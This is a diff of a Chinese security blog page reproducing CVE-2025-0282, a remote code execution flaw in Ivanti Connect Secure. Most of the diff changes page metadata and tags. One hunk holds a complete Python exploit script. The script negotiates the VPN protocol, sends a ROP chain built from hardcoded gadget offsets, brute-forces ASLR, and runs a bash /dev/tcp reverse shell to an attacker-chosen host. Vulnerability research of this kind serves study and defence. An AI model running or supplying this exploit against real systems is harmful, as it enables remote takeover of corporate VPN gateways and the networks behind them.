@@ -4,25 +4,37 @@
   <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
   <meta name="author" content="Misaki" />
-  <!-- Open Graph Description 简短摘要-->
   
-  <!-- 用于搜索引擎的文章摘要 -->
-  
-  <!-- 文章页 -->
   <meta name="description" content="记录 Ivanti Connect Secure 22.7R2.3 环境搭建、文件提取、gdbserver 调试、DSStr 相关分析、ROP 链构造与 RCE 复现流程。" />
   
+  <link rel="canonical" href="https://misaki.wiki/1e552f1b.html">
+  <meta property="og:site_name" content="Misaki" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试 | Misaki" />
+  
+  <meta property="og:description" content="记录 Ivanti Connect Secure 22.7R2.3 环境搭建、文件提取、gdbserver 调试、DSStr 相关分析、ROP 链构造与 RCE 复现流程。" />
+  
+  <meta property="og:url" content="https://misaki.wiki/1e552f1b.html" />
+  
+  <meta property="og:image" content="https://misaki.wiki/img/misaki.jpg" />
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试 | Misaki" />
+  
+  <meta name="twitter:description" content="记录 Ivanti Connect Secure 22.7R2.3 环境搭建、文件提取、gdbserver 调试、DSStr 相关分析、ROP 链构造与 RCE 复现流程。" />
+  
+  
+  <meta name="twitter:image" content="https://misaki.wiki/img/misaki.jpg" />
   
   
   <title>
-    
-      CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试 
-      
-      
-      |
-    
-     Misaki
+    CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试 | Misaki
   </title>
+  
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试","description":"记录 Ivanti Connect Secure 22.7R2.3 环境搭建、文件提取、gdbserver 调试、DSStr 相关分析、ROP 链构造与 RCE 复现流程。","url":"https://misaki.wiki/1e552f1b.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://misaki.wiki/1e552f1b.html"},"datePublished":"2026-01-08T12:35:00.000Z","dateModified":"2026-06-16T07:55:51.777Z","author":{"@type":"Person","name":"Misaki"},"publisher":{"@type":"Organization","name":"Misaki"},"image":["https://misaki.wiki/img/misaki.jpg"],"articleSection":"CVE","keywords":"pwn, CVE, RCE, Ivanti, ROP, gdb"}</script>
+  
 
   
     <link rel="apple-touch-icon" href="/img/favicon.ico">
@@ -96,6 +108,14 @@
           <a href="/archives/">文章</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
         <li class="nav-item" data-path="/friends/">
           <a href="/friends/">友链</a>
         </li>
@@ -116,21 +136,6 @@
       <div class="flex-container">
         <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
 <!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
-
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
 
 
 
@@ -159,13 +164,65 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试</div>
+      <h1 class="post-title">CVE-2025-0282 Ivanti Connect Secure RCE 漏洞复现与调试</h1>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-          2026-06-13 19:12:42
+          2026-06-16 15:55:51
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CVE/" title="CVE">
+                    <b>#</b> CVE
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn/" title="pwn">
+                    #pwn
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CVE/" title="CVE">
+                    #CVE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/RCE/" title="RCE">
+                    #RCE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Ivanti/" title="Ivanti">
+                    #Ivanti
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/ROP/" title="ROP">
+                    #ROP
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/gdb/" title="gdb">
+                    #gdb
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
       <div class="markdown-body">
         <p><strong>实验对象</strong>：Ivanti Connect Secure 22.7R2.3<br>[[CVE]]<br><a href="%5Bhttps://pulsezta.blob.core.windows.net/gateway/nsa/ISA-V-VMWARE-ICS-22.7R2.3-3431.1.zip%5D(https://pulsezta.blob.core.windows.net/gateway/nsa/ISA-V-VMWARE-ICS-22.7R2.3-3431.1.zip)">虚拟机下载</a></p>
@@ -225,6 +282,7 @@
 <p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/4549ec4c855118878d58b421ff64de78.png" alt="4549ec4c855118878d58b421ff64de78.png"><br>成功</p>
 <p>远程RCE<br>因为程序开启了pie保护，且是32位，我们可以进行爆破，成功概率大概为 1&#x2F;4096。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">CVE-2025-0282 Direct Exploit - 跳过版本检测直接发送payload</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">txt</span>):</span><br><span class="line">    <span class="built_in">print</span>(txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target_ip, target_port, lhost, lport</span>):</span><br><span class="line">    log(<span class="string">f&quot;[+] Target: <span class="subst">&#123;target_ip&#125;</span>:<span class="subst">&#123;target_port&#125;</span>&quot;</span>)</span><br><span class="line">    log(<span class="string">f&quot;[+] Reverse shell: <span class="subst">&#123;lhost&#125;</span>:<span class="subst">&#123;lport&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 目标配置 - 22.7.2.3597</span></span><br><span class="line">    target = &#123;</span><br><span class="line">        <span class="string">&#x27;padding_to_vftable&#x27;</span>: <span class="number">2288</span>,</span><br><span class="line">        <span class="string">&#x27;vftable_gadget_offset&#x27;</span>: <span class="number">0x00934365</span> + <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;padding_to_next_frame&#x27;</span>: <span class="number">2934</span>,</span><br><span class="line">        <span class="string">&#x27;offset_to_got_plt&#x27;</span>: <span class="number">0x00157c000</span>,</span><br><span class="line">        <span class="string">&#x27;gadget_inc_ebx_ret&#x27;</span>: <span class="number">0x01338373</span>,</span><br><span class="line">        <span class="string">&#x27;gadget_mov_eax_esp_retn_c&#x27;</span>: <span class="number">0x00ca2e84</span>,</span><br><span class="line">        <span class="string">&#x27;gadget_add_eax_8_ret&#x27;</span>: <span class="number">0x007a040c</span>,</span><br><span class="line">        <span class="string">&#x27;gadget_mov_esp_eax_call_system&#x27;</span>: <span class="number">0x004f0df3</span>,</span><br><span class="line">        <span class="string">&#x27;libdsplibs_base&#x27;</span>: <span class="number">0xf6492000</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反弹shell命令</span></span><br><span class="line">    cmd = <span class="string">f&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/<span class="subst">&#123;lhost&#125;</span>/<span class="subst">&#123;lport&#125;</span> &lt;&amp;1&#x27;;#&quot;</span></span><br><span class="line">    cmd = cmd.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>)</span><br><span class="line">    log(<span class="string">f&quot;[*] Command: <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    attempt = <span class="number">0</span></span><br><span class="line">    max_attempts = <span class="number">4096</span></span><br><span class="line">    </span><br><span class="line">    log(<span class="string">f&quot;[*] Starting ASLR bruteforce (<span class="subst">&#123;max_attempts&#125;</span> attempts)&quot;</span>)</span><br><span class="line">    log(<span class="string">f&quot;[*] This may take ~<span class="subst">&#123;max_attempts * <span class="number">0.8</span> / <span class="number">60</span>:<span class="number">.1</span>f&#125;</span> minutes...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(max_attempts):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            sock.settimeout(<span class="number">15</span>)</span><br><span class="line">            </span><br><span class="line">            ctx = ssl.create_default_context()</span><br><span class="line">            ctx.check_hostname = <span class="literal">False</span></span><br><span class="line">            ctx.verify_mode = ssl.CERT_NONE</span><br><span class="line">            ssock = ctx.wrap_socket(sock, server_hostname=target_ip)</span><br><span class="line">            ssock.connect((target_ip, target_port))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 1: HTTP Upgrade</span></span><br><span class="line">            http_req = (</span><br><span class="line">                <span class="string">f&quot;GET / HTTP/1.1\r\n&quot;</span></span><br><span class="line">                <span class="string">f&quot;Host: <span class="subst">&#123;target_ip&#125;</span>:<span class="subst">&#123;target_port&#125;</span>\r\n&quot;</span></span><br><span class="line">                <span class="string">&quot;User-Agent: AnyConnect-compatible OpenConnect VPN Agent v9.12\r\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Content-Type: EAP\r\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Upgrade: IF-T/TLS 1.0\r\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Content-Length: 0\r\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">            )</span><br><span class="line">            ssock.send(http_req.encode())</span><br><span class="line">            </span><br><span class="line">            response = ssock.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;101 Switching Protocols&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 2: Version negotiation</span></span><br><span class="line">            version_data = struct.pack(<span class="string">&#x27;4B&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">            version_pkt = struct.pack(<span class="string">&#x27;&gt;4I&#x27;</span>, <span class="number">0x00005597</span>, <span class="number">0x00000001</span>, <span class="built_in">len</span>(version_data) + <span class="number">16</span>, <span class="number">0</span>) + version_data</span><br><span class="line">            ssock.send(version_pkt)</span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 3: 构造ROP payload</span></span><br><span class="line">            buffer = <span class="string">b&#x27;C&#x27;</span> * target[<span class="string">&#x27;padding_to_vftable&#x27;</span>]</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;vftable_gadget_offset&#x27;</span>])</span><br><span class="line">            buffer += <span class="string">b&#x27;A&#x27;</span> * target[<span class="string">&#x27;padding_to_next_frame&#x27;</span>]</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;offset_to_got_plt&#x27;</span>] - <span class="number">1</span>)</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;4I&#x27;</span>, <span class="number">0xCAFEBEEF</span>, <span class="number">0xCAFEBEEF</span>, <span class="number">0xCAFEBEEF</span>, <span class="number">0xCAFEBEEF</span>)</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_inc_ebx_ret&#x27;</span>])</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_mov_eax_esp_retn_c&#x27;</span>])</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_add_eax_8_ret&#x27;</span>])</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;3I&#x27;</span>, <span class="number">0xCAFEBEEF</span>, <span class="number">0xCAFEBEEF</span>, <span class="number">0xCAFEBEEF</span>)</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;4I&#x27;</span>, </span><br><span class="line">                target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_add_eax_8_ret&#x27;</span>],</span><br><span class="line">                target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_add_eax_8_ret&#x27;</span>],</span><br><span class="line">                target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_add_eax_8_ret&#x27;</span>],</span><br><span class="line">                target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_add_eax_8_ret&#x27;</span>]</span><br><span class="line">            )</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, target[<span class="string">&#x27;libdsplibs_base&#x27;</span>] + target[<span class="string">&#x27;gadget_mov_esp_eax_call_system&#x27;</span>])</span><br><span class="line">            buffer += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0xCAFEBEEF</span>)</span><br><span class="line">            buffer += cmd.encode() + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">            attempt += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 实时显示每次尝试</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] Attempt #<span class="subst">&#123;attempt&#125;</span>/<span class="subst">&#123;max_attempts&#125;</span> | Base: 0x<span class="subst">&#123;target[<span class="string">&#x27;libdsplibs_base&#x27;</span>]:08x&#125;</span>&quot;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 4: 发送exploit</span></span><br><span class="line">            exploit_data = <span class="string">b&quot;clientHostName=abcdefgh clientIp=127.0.0.1 clientCapabilities=&quot;</span> + buffer + <span class="string">b&quot;\n\x00&quot;</span></span><br><span class="line">            exploit_pkt = struct.pack(<span class="string">&#x27;&gt;4I&#x27;</span>, <span class="number">0x00000a4c</span>, <span class="number">0x00000088</span>, <span class="built_in">len</span>(exploit_data) + <span class="number">16</span>, <span class="number">1</span>) + exploit_data</span><br><span class="line">            ssock.send(exploit_pkt)</span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">0.2</span>)  <span class="comment"># 稍微减少等待时间加快爆破</span></span><br><span class="line">            ssock.close()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()  <span class="comment"># 换行</span></span><br><span class="line">    log(<span class="string">f&quot;[*] Completed <span class="subst">&#123;attempt&#125;</span> attempts&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;target_ip&gt; &lt;target_port&gt; &lt;lhost&gt; &lt;lport&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Example: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> 192.168.13.200 443 192.168.13.146 9999&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    target_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    target_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    lhost = sys.argv[<span class="number">3</span>]</span><br><span class="line">    lport = <span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    log(<span class="string">&quot;[!] Start listener first: nc -lvp &quot;</span> + <span class="built_in">str</span>(lport))</span><br><span class="line">    log(<span class="string">&quot;[!] Press Enter to start exploit...&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    </span><br><span class="line">    exploit(target_ip, target_port, lhost, lport)</span><br></pre></td></tr></table></figure>
+
       </div>
       
         <div class="prev-or-next">
@@ -239,9 +297,61 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-              2026-06-13 19:12:42
+              2026-06-16 15:55:51
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CVE/" title="CVE">
+                        <b>#</b> CVE
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn/" title="pwn">
+                        #pwn
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CVE/" title="CVE">
+                        #CVE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/RCE/" title="RCE">
+                        #RCE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Ivanti/" title="Ivanti">
+                        #Ivanti
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/ROP/" title="ROP">
+                        #ROP
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/gdb/" title="gdb">
+                        #gdb
+                      </a>
+                    </span>
+                    
+                  </span>
+              
           </div>
           <div class="post-foot-prev">
             
